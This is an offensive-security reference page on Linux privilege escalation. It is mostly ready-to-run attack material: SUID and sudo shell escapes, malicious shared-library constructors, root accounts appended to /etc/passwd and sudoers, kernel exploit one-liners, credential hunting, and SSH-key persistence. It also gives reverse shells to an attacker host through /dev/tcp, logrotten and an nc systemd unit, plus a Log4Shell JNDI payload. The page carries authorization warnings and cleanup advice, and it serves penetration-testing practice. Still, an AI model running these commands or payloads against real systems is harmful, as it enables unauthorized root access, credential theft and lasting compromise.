# Linux Privilege Escalation

Linux privilege escalation turns a constrained shell into a more privileged execution context. Work from identity and configuration toward code execution: group membership, `sudo -l`, SUID binaries, capabilities, scheduled jobs, and writable service paths usually provide stronger evidence than kernel-version matching alone.

{% hint style="danger" %}
Run these techniques only on authorized targets or isolated training systems. Start with read-only enumeration, record the original state, and use the least invasive proof that demonstrates impact. When practicing a high-impact technique, snapshot the target first and follow the cleanup guidance.
{% endhint %}

## Methodology at a Glance

| Phase | Goal | High-signal checks |
| --- | --- | --- |
| Context | Establish identity and host constraints | `id`, `sudo -l`, OS release, mount options, security modules |
| Configuration | Find delegated or writable privilege | Sudo rules, SUID/SGID, capabilities, groups, cron, systemd |
| Secrets | Identify scoped credential exposure | Environment, histories, configs, process arguments, SSH material |
| Exploitation | Prove one escalation path | Minimum-impact command, marker, or protected-file read |
| Closeout | Restore and verify | Remove test artifacts, repeat the trigger, preserve evidence |

{% hint style="info" %}
Check configuration-level primitives before kernel vulnerabilities. They are easier to validate, less likely to destabilize the target, and usually produce clearer remediation guidance.
{% endhint %}

{% hint style="warning" %}
Run SUID enumeration **before** upgrading to a PTY. Certain AppArmor/namespace configurations hide binaries from `find` after a shell upgrade that were visible in the raw shell.
{% endhint %}

## Fast Enumeration Checklist

```bash
id                                                                          # groups first — disk, docker, lxd, adm, mlocate, staff all matter
sudo -l
find / -perm -4000 -type f 2>/dev/null                                     # SUID
find / -perm -2000 -type f 2>/dev/null                                     # SGID
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace'
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
systemctl list-timers --all
# THEN LinPEAS / pspy — not first.
```

```bash
whoami; id; hostname; ip a; sudo -l
uname -a && cat /etc/os-release
cat /proc/version
```

{% hint style="info" %}
Test recovered credentials only against in-scope identities and services. Start with the account or service the credential is associated with, record each authentication attempt, and avoid broad reuse that could trigger lockouts or touch unrelated systems.
{% endhint %}

### Enumeration Tools

```bash
# LinPEAS
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a    # all checks - deeper system enumeration
./linpeas.sh -s    # reduced-output enumeration
./linpeas.sh -P    # pass a password to be used with sudo -l

# Linux Smart Enumeration
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
chmod +x lse.sh
./lse.sh -l1       # interesting info that should help you privesc
./lse.sh -l2       # dump everything it gathers

# LinEnum
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t

# pspy — monitor cron jobs/processes without root
./pspy64 -pf -i 1000
```

| Tool | Purpose |
| --- | --- |
| LinPEAS | Deep automated enumeration, colour-coded findings |
| LSE | Leveled enumeration, quick or exhaustive |
| LinEnum | Classic enumeration script |
| pspy | Process/cron monitoring without privileged read access |
| unix-privesc-check | Config/permission audit |
| SUDO_KILLER | Sudo-misconfiguration-specific enumeration |
| BeRoot | Cross-checks common privesc misconfigurations |
| linuxprivchecker.py | Broad Python enumeration script |

## Prioritized Escalation Vectors

| Rank | Pattern | Notes |
| --- | --- | --- |
| 1 | **Credential exposure or reuse** | Validate against the associated in-scope identity without causing lockouts |
| 2 | **`sudo -l` abuse (GTFOBins first)** | Never assume a kernel exploit before checking the allowed binary |
| 3 | **SUID / GTFOBins binaries** | `find / -perm -4000` then look each hit up |
| 4 | **Cron abuse** | Writable root-run script, PATH hijack, wildcard injection, `LD_LIBRARY_PATH` |
| 5 | **Library / interpreter hijack** | Root process loads a library or module from a writable path |
| 6 | **Dangerous group membership** | `disk`, `docker`, `lxd`, `adm`, `shadow`, `mlocate` |
| 7 | **Leaked / reused SSH keys** | Git history, world-readable keys, exposed shares |
| 8 | **Writable / misconfigured systemd unit** | Combine with `NOPASSWD: /sbin/reboot` |
| 9 | **Linux capabilities** | `cap_setuid=ep` on any interpreter = instant root |
| 10 | **Kernel vulnerabilities** | Last resort; verify exact build and mitigations before controlled testing |

## SUID and SGID Binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f -exec ls -la {} 2>/dev/null \;
```

Cross-reference every hit against **GTFOBins** (gtfobins.github.io). Vulnerable/unintended-functionality binaries also apply.

### SUID Interpreter/Binary One-Liners

| Binary | One-liner |
| --- | --- |
| `/usr/bin/php*` | `/usr/bin/php7.4 -r "pcntl_exec('/bin/bash', ['-p']);"` |
| `/usr/bin/find` | `find . -exec /bin/bash -p \; -quit` |
| `/usr/bin/wget` | `/usr/bin/wget --output-document=/etc/passwd http://<ATTACKER_IP>/passwd_pwn` |
| `/usr/sbin/start-stop-daemon` | `/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p` |
| `/bin/bash` (SUID via cron/dlopen) | `/tmp/rbash -p` — `-p` mandatory to keep euid=0 |
| `/usr/bin/pkexec` (0.105/0.112/0.117) | PwnKit CVE-2021-4034 |

{% hint style="danger" %}
`-p` on `bash` preserves euid when uid ≠ euid. Miss it and SUID bash silently drops back to your own user.
{% endhint %}

### SUID Binary — Relative Path Hijack

```bash
strings <SUID_BINARY>           # find a called binary by name (no full path)
cp /bin/bash <CALLED_BINARY>    # replace with bash
./<SUID_BINARY>                 # root shell
```

### SUID `wget`/`curl`/`tee` — Arbitrary File Write

```bash
# On attacker
openssl passwd -1 -salt xz pwn         # -> $1$xz$yngOn5TNvm.S1inBEAq8q0
cp /etc/passwd passwd_pwn
cat >> passwd_pwn <<EOF
pwn:\$1\$xz\$yngOn5TNvm.S1inBEAq8q0:0:0:root:/root:/bin/bash
EOF
sudo python3 -m http.server 80

# On target
/usr/bin/wget --output-document=/etc/passwd http://<ATTACKER_IP>/passwd_pwn
su pwn      # password: pwn -> root
```

Other write targets with a write-any-file SUID/sudo primitive: `/etc/sudoers`, `/etc/shadow`, `/etc/cron.d/root`, `~root/.ssh/authorized_keys`.

### SUID `dlopen()` Constructor Hijack

Any SUID binary that `dlopen()`s a path in a writable directory — the constructor fires *before* the binary can drop privileges.

```bash
strings <suid> | grep -E 'dlopen|dlsym|/home|/tmp|/opt|/var|LD_'
```

```c
#include <stdlib.h>
#include <unistd.h>
void init_plugin(void) __attribute__((constructor));
void init_plugin(void) {
    setuid(0); setgid(0);
    setenv("PATH", "/usr/bin:/bin", 1);
    system("/bin/bash -p");
    exit(0);
}
```

```bash
gcc -shared -fPIC -o /writable/dir/libsecurity.so /tmp/lib.c
```

Related: `readelf -d <binary> | grep -E 'PATH'` catches RPATH/RUNPATH hijacks the same way.

## Sudo Exploitation

```bash
sudo -l
sudo -l -U <user>
```

```bash
# NOPASSWD sudo
sudo vim -c '!sh'
sudo /usr/bin/vim -c ':!/bin/bash'
```

### GTFOBins — High-Value Extras

| Command | Technique |
| --- | --- |
| `sudo git -p help` | Pager escape — `!/bin/bash` inside the pager |
| `sudo tcpdump -z <cmd>` | `-z` runs a post-rotation command as root |
| `sudo apt-get changelog apt` | Pager escape via `!` |
| `sudo systemctl status <unit>` | Shrink terminal (`stty rows 5`) to force the pager, then `!/bin/bash` |
| `sudo env <prog>` | `env` execs `<prog>` directly as root |
| `sudo composer` | `composer.json` `scripts` map becomes root's argv |
| `sudo tar` | `--checkpoint=1 --checkpoint-action=exec=<cmd>` |
| `sudo /usr/bin/mail --exec` | `mail --exec='!/bin/sh'` |
| `sudo rsync` | `-e 'sh -c "sh 0<&2 1>&2"'` overrides the transport shell |
| `sudo make -C <writable-dir>` | Rewrite the Makefile (tab-indented commands) |

```bash
# tcpdump post-rotation command
cat > /tmp/pwn.sh <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/pwn.sh
sudo tcpdump -ln -i lo -w /dev/null -W1 -G1 -z /tmp/pwn.sh
/bin/bash -p
```

```bash
# systemctl/journalctl/man/less pager escape
stty rows 5
sudo /usr/bin/systemctl status <service>
# at the ':' prompt: !/bin/bash
```

```bash
# make -C Makefile hijack
printf 'install:\n\t/bin/bash\n' > /writable/dir/Makefile
sudo /usr/bin/make install -C /writable/dir
```

{% hint style="info" %}
If a GTFOBins one-liner "should" work but fails with `execlp: Permission denied` or a similarly odd error, AppArmor is blocking the sudo'd binary's post-exec. `aa-status` / `cat /etc/apparmor.d/usr.sbin.<binary>` confirms it — pick an in-process alternative (e.g. `python -c ...`) instead of exec-ing a shell.
{% endhint %}

### Sudo Path Glob Traversal

Sudo's `fnmatch(3)` runs without `FNM_PATHNAME` — `*` matches `/`. Any `sudo -l` entry of the form `/path/*.ext` is worth testing traversal against:

```
sudo -l:  (root) NOPASSWD: /usr/bin/web-scraper /root/downloaded/*.html
sudo /usr/bin/web-scraper /root/downloaded/../../tmp/pwn.html
```

### Sudoers `!env_reset` → Language-Runtime Env-Var Injection

`sudo -l | grep -iE '!env_reset|env_keep|SETENV'` — when env vars survive sudo, language runtimes with load-time hooks become the attack surface.

| Runtime | Env var | Effect |
| --- | --- | --- |
| Node | `NODE_OPTIONS='--require /tmp/x.js'` | Executes JS at startup |
| Python | `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONBREAKPOINT=os.system` | Import-time hook |
| Perl | `PERL5OPT=-Mmodule`, `PERL5LIB` | `-M` loads any module |
| Ruby | `RUBYOPT=-rmodule`, `RUBYLIB` | `-r` loads any module |
| dyn-linked | `LD_PRELOAD` (needs `env_keep+=LD_PRELOAD` or SETENV) | Loads a `.so` at startup |
| Git | `GIT_EXEC_PATH`, `GIT_TEMPLATE_DIR` | Subcommand hijack |

```bash
cat > /tmp/x.js <<'EOF'
require('child_process').execSync('chmod u+s /bin/bash');
EOF
NODE_OPTIONS='--require /tmp/x.js' sudo /usr/bin/web-scraper /path/to/any.html
/bin/bash -p
```

### LD_PRELOAD Injection

```bash
# Defaults env_keep += LD_PRELOAD
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/sh");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

### doas (OpenBSD / Alpine / custom Linux)

```bash
cat /usr/local/etc/doas.conf
# permit nopass <USER> as root cmd /usr/bin/dstat
echo 'import os; os.execv("/bin/bash", ["bash"])' > /usr/local/share/dstat/dstat_exploit.py
doas /usr/bin/dstat --exploit
```

### CVE-2023-22809 (sudoedit Bypass)

Affects sudo before 1.9.12p2. Inject an extra file into the sudoedit session via `EDITOR`:

```bash
# sudoers allows: (root) sudoedit /path/to/allowed/file
EDITOR="vim -- /etc/sudoers" sudoedit -u <TARGET_USER> /path/to/allowed/file
```

### CVE-2019-14287

Exploitable when sudoers has `(ALL, !root) ALL`:

```bash
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

## Capabilities

```bash
getcap -r /usr/bin 2>/dev/null
```

| Capability | Risk | Exploitation |
| --- | --- | --- |
| `cap_setuid+ep` | CRITICAL | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_dac_read_search` | HIGH | Read any file |
| `cap_dac_override` | HIGH | Write any file |
| `cap_sys_ptrace` | HIGH | Inject into other processes |
| `cap_net_bind_service` | MEDIUM | Bind to privileged ports |

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.10 cap_setuid=ep    <- immediate root
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Also check `perl`, `ruby`, `node`, and custom binaries for the same capability.

## Cron Jobs and Scheduled Tasks

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l
crontab -u <user> -l
cat /var/spool/cron/crontabs/*
systemctl list-timers --all
```

### PATH Hijack via `run-parts`

If `/etc/crontab`'s PATH lists a world-writable directory before `/bin`, and cron calls a binary unqualified:

```bash
cat > /usr/local/bin/run-parts <<'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
EOF
chmod 777 /usr/local/bin/run-parts
```

```bash
for d in $(grep '^PATH=' /etc/crontab | sed 's/PATH=//' | tr ':' ' '); do ls -ld "$d"; done
```

### `LD_LIBRARY_PATH` Crontab Hijack

```bash
cat /etc/crontab
# LD_LIBRARY_PATH=/usr/lib:/usr/local/lib/dev
# * * * * * root /usr/bin/log-sweeper
ldd /usr/bin/log-sweeper       # utils.so => not found — resolved via LD_LIBRARY_PATH order
```

```c
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() { system("chmod +s /bin/bash"); }
```

```bash
gcc -shared -fPIC -o /usr/local/lib/dev/utils.so /tmp/evil.c -nostartfiles
```

### Writable Root Cron Script

Owner-check trumps mode string — `-rwxr-xr-x` looks locked, but if you own the file you can rewrite it.

```bash
find / -writable -type f 2>/dev/null | grep -E "\.(sh|py|conf|service)$"
echo 'cp /bin/bash /tmp/rb && chmod 4755 /tmp/rb' >> /path/to/root-owned-script.sh
```

Catch user-crontabs (unreadable to non-root) with pspy:

```bash
wget http://<ATTACKER_IP>:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
timeout 90 /tmp/pspy64
```

## PATH Abuse

If a SUID binary calls a command without an absolute path:

```bash
strings /usr/local/bin/vulnerable_suid | grep -E "^[a-z]+$"
cd /tmp
echo '/bin/bash -p' > ls
chmod +x ls
export PATH=/tmp:$PATH
/usr/local/bin/vulnerable_suid
```

## Wildcard Injection

```bash
# Vulnerable cron: tar cf archive.tar *
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cat /etc/passwd > /tmp/flag' >> shell.sh
chmod +x shell.sh
```

```bash
# rm * -> create -f option
touch -- "-f"
# cp * -> create source files
touch -- "-u"
```

**Direct `sudo tar`/`sudo 7za` GTFOBin** (distinct from the cron-wildcard trick — you invoke it under sudo yourself):

```bash
sudo tar -czvf /tmp/b.tar.gz /dev/null --checkpoint=1 --checkpoint-action=exec='chmod +s /bin/bash'
```

## Writable System Files

```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
```

```bash
openssl passwd -1 -salt hacker hacker
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
su - hacker    # password: hacker
```

```bash
echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers
echo "username ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

If `/etc/shadow` is writable directly, extract hashes and crack, or overwrite root's hash outright.

## NFS Root Squashing

```bash
cat /etc/exports
showmount -e <TARGET>
```

```bash
# On attacker, if no_root_squash is present
mkdir /tmp/nfsdir
mount -t nfs <TARGET>:/shared /tmp/nfsdir
cp /bin/bash /tmp/nfsdir/
chmod +s /tmp/nfsdir/bash
# On target
/shared/bash -p
```

## Shared Library Hijacking

```bash
ldd /opt/binary
gcc -Wall -fPIC -shared -o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf
ldconfig -l /tmp/vulnlib.so
/opt/binary
```

```bash
readelf -d flag15 | egrep "NEEDED|RPATH"
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6
cp libc.so.6 /var/tmp/flag15/
```

## Container Escape

{% hint style="warning" %}
The commands below cross the container boundary and provide host-root access. Keep them for isolated practice; on an assessment, begin with the read-only proofs and cleanup workflow in [Container Escape](container-escape.md).
{% endhint %}

```bash
# Privileged container with host filesystem
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
chroot /host /bin/bash

# docker group (no sudo needed)
docker run -v /:/mnt -it alpine chroot /mnt bash
```

```bash
# LXD group
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## Dangerous Group Membership

```bash
id
```

| Group | Attack |
| --- | --- |
| `disk` | Raw block-device read/write via `debugfs` |
| `docker` | `docker run -v /:/mnt -it alpine chroot /mnt bash` |
| `lxd` | `lxc init alpine privesc -c security.privileged=true` + `/` mount |
| `adm` | Read `/var/log/*` — auth.log often has cleartext creds |
| `shadow` | Read `/etc/shadow` directly |
| `mlocate` | Query `/var/lib/mlocate/mlocate.db` for filenames inside 700 dirs |

```bash
mount | grep ' / '       # find root device, e.g. /dev/sda2
debugfs /dev/sda2
debugfs:  cat /root/proof.txt
debugfs:  dump /root/.ssh/id_rsa /tmp/rootkey
debugfs:  dump /etc/shadow /tmp/shadow
```

`debugfs -w` also enables write (append a root user to `/etc/passwd`) but risks filesystem corruption.

## Kernel Exploits

Run these only after configuration paths are exhausted. Kernel escalation can crash or corrupt the target, so verify the exact build, patch state, architecture, and active mitigations before controlled testing.

| CVE | Affected | Notes |
| --- | --- | --- |
| **CVE-2021-4034** (PwnKit) | pkexec ≤ 0.120 — most 2021-era distros | `ly4k/PwnKit` precompiled; instant root |
| **CVE-2021-3156** (Baron Samedit) | sudo 1.8.2–1.8.31p2, 1.9.0–1.9.5p1 | Heap overflow, no sudo privileges needed |
| **CVE-2022-0847** (Dirty Pipe) | Kernel 5.8 – 5.16.11 | Write to read-only files |
| **CVE-2016-5195** (Dirty COW) | Kernel ≤ 3.19.0-73.8 | FireFart variant needs `-lcrypt` |
| **CVE-2023-0386** (OverlayFS) | Ubuntu kernel 5.19.0-35-era | Unprivileged userns + overlayfs + capability injection |
| **CVE-2023-2640/2023-32629** (GameOver(lay)) | Ubuntu 22.04/23.04 | Neutralised on 23.04+ by `apparmor_restrict_unprivileged_userns=1` |
| **CVE-2021-22555 / CVE-2022-2588** | Netfilter, kernel 2.6.19-5.19 | Heap OOB write / UAF |
| **CVE-2017-16995** | Ubuntu 16.04, kernel 4.4-4.14 | eBPF verifier sign-extension bug |
| **CVE-2010-3904 / 2010-4258 / 2012-0056** | Legacy 2.6.x kernels | RDS, Full Nelson, Mempodipper |

```bash
# Confirm mitigation status before wasting time on GameOver(lay)
cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns    # 1 = neutralised
```

```bash
# CVE-2023-0386 one-liner
cd /tmp && rm -rf l u w m && unshare -rm sh -c "mkdir l u w m && cp /usr/bin/perl l/ && setcap cap_setuid+eip l/perl && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*" && u/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

```bash
# Baron Samedit
sudoedit -s '\' $(python3 -c 'print("A"*1000)')  # segfault = vulnerable
git clone https://github.com/blasty/CVE-2021-3156.git && cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich <target_number>
```

```bash
# Find Exploits
uname -a && cat /etc/os-release
./linux-exploit-suggester.sh
searchsploit -w linux kernel <version>
```

## Password Hunting

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
grep -ri "password" /home/* 2>/dev/null
grep -ri "PRIVATE KEY" /home/* 2>/dev/null
cat /home/*/.bash_history
cat /etc/security/opasswd    # old password history, if readable
env | grep -i pass
printenv | grep -i secret
```

**Live process credential snoop** — some scripts/cron jobs pass credentials on the command line, briefly visible in `/proc/<PID>/cmdline`:

```bash
watch -n 1 "ps -eo pid,user,cmd | grep -Ei 'pass|token|sshpass|-p ' | grep -v grep"
```

**`/proc/<PID>/status` UID interpretation** — confirms a running process is currently escalated:

```bash
cat /proc/$$/status | grep Uid
# Uid:    real    effective    saved    fs
# Uid:    1000    0            0        0       <-- SUID root: real=user, effective=root
```

**HashiCorp Vault SSH OTP:**

```bash
vault read ssh/roles/root_otp
vault ssh -role root_otp -mode otp root@127.0.0.1
```

**Log4Shell credential leak (CVE-2021-44228)** — inject a JNDI payload into any logged field (FTP username, HTTP headers, form fields):

```
${jndi:ldap://<ATTACKER_IP>:1389/exploit}
```

**Passpie password manager:**

```bash
cat ~/.passpie/.keys
gpg2john pgp-key.txt > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
passpie export creds.txt
```

## SSH Keys

```bash
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "*.pem" 2>/dev/null
```

```bash
# Persistence
ssh-keygen -t rsa -N "" -f /tmp/id_rsa
cat /tmp/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

{% hint style="warning" %}
Adding an SSH key creates durable access. Use a dedicated training key with a unique comment, and follow [Linux Persistence](linux-persistence.md) for scoped creation, detection evidence, exact-line removal, and verification.
{% endhint %}

**Strip a forced-command wrapper via `scp -O`** — when a private key's `authorized_keys` entry is prefixed `command="…/wrapper.sh"` but the wrapper still permits `scp`:

```bash
chmod 600 id_rsa
ssh-keygen -y -f id_rsa > authorized_keys      # rebuild the pubkey WITHOUT the forced-command prefix
scp -O -i id_rsa authorized_keys <user>@<TARGET>:/home/<user>/.ssh/authorized_keys
ssh -i id_rsa <user>@<TARGET>
```

`-O` forces the legacy SCP protocol; modern OpenSSH defaults to the SFTP subsystem, which a `scp*`-matching forced-command wrapper rejects.

## Escaping Restricted Shells

```bash
echo $SHELL       # rbash, rksh, rzsh
cd /tmp           # "restricted" error confirms it
```

| Shell | Restrictions |
| --- | --- |
| `rbash` | No `cd`, no modifying env vars, no commands in other dirs |
| `rksh` | No commands in other dirs, no shell functions, no env modification |
| `rzsh` | No shell scripts, no aliases, no env modification |

```bash
# Interpreters
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
awk 'BEGIN {system("/bin/bash")}'

# Editors
vi
:set shell=/bin/bash
:shell

# Chaining / substitution
ls; /bin/bash
$(/bin/sh)
ssh <USER>@<TARGET> -t "bash --noprofile"
```

## Miscellaneous Local Root Techniques

**Logrotate (`logrotten`)** — vulnerable versions (3.8.6, 3.11.0, 3.15.0, 3.18.0) exploited via race condition when you have write access to a rotated log:

```bash
git clone https://github.com/whotwagner/logrotten.git && cd logrotten && gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload
./logrotten -p ./payload /path/to/writable.log
```

**Python module hijack via a sudoers script:**

```bash
# sudo -l:  (ALL) NOPASSWD: /usr/bin/python /home/user/wifi_reset.py
cat > /home/user/wificontroller.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/bash_root && chmod u+s /tmp/bash_root")
EOF
sudo /usr/bin/python /home/user/wifi_reset.py
```

**tmux / screen session hijack:**

```bash
tmux list-sessions
ls -la /tmp/tmux-*
tmux -S /tmp/tmux-0/default attach

screen -ls
screen -x root/<session_name>
```

**Passive traffic capture** if `tcpdump` is available unprivileged:

```bash
tcpdump -i any -w capture.pcap
sudo tcpdump -i lo -A | grep -Ei "pass|token|auth"
```

**GNU Screen < 4.5.1 local root** — compile a constructor library + a setuid-shell loader, then abuse Screen's log flag to write `/etc/ld.so.preload`:

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

**7za/7z wildcard arbitrary-file read** — a root cron archiving with a `*` glob in a directory you can write to; `@name` is treated as a listfile, and invalid entries get echoed back in a warning message:

```bash
cd /writable/globbed/dir
ln -s /root/.ssh/id_rsa leak.zip
touch @leak.zip
sleep 65
cat /path/to/backup.log     # target file content echoed in the warning line
```

**fail2ban `actionban` hijack** — if `/etc/fail2ban/action.d/*.conf` is writable, fail2ban runs the ban action as root:

```bash
sed -i 's|^actionban = .*|actionban = chmod u+s /bin/bash|' /etc/fail2ban/action.d/iptables-multiport.conf
# trigger a ban (several failed SSH logins), then:
/bin/bash -p
```

**Writable systemd unit + `sudo reboot`:**

```bash
cat > /etc/systemd/system/pythonapp.service <<'EOF'
[Service]
Type=simple
ExecStart=nc <ATTACKER_IP> 80 -e /bin/bash
User=root
[Install]
WantedBy=multi-user.target
EOF
sudo /sbin/reboot
```

## Evidence and Cleanup

For each tested path, capture the initial identity, vulnerable permission or configuration, exact proof command, resulting effective identity, and relevant logs. In live assessments, prefer protected-file metadata or a marker proof when a durable root shell is unnecessary. In isolated training, retain the complete procedure but still practice rollback.

| Artifact | Cleanup verification |
| --- | --- |
| Temporary binary or library | File absent; original hash or package file intact |
| SUID or capability change | Original mode or capability restored and re-read |
| Cron, timer, or service change | Entry removed; trigger repeated without execution |
| Account, sudoers, or SSH change | Exact entry removed; syntax and authentication rechecked |
| Container or mount | Workload deleted; mount absent; no unexpected volume or image remains |

{% hint style="warning" %}
Never use broad cleanup commands that can remove legitimate configuration. Restore the exact object changed, verify the original owner and mode, and document anything that cannot be reverted safely.
{% endhint %}

## Related

- [Windows Privilege Escalation](windows-privesc-methodology.md)
- [Linux Persistence](linux-persistence.md)
- [Container Escape](container-escape.md)
- [Password & Hash Attacks](password-hash-attacks.md)
- [Credential Dumping](credential-dumping.md)
- [Lateral Movement](lateral-movement.md)
- [Active Directory Attacks](ad-attacks.md)
- [Shells & Payloads](shells-payloads.md)
- [Report Writing](report-writing.md)
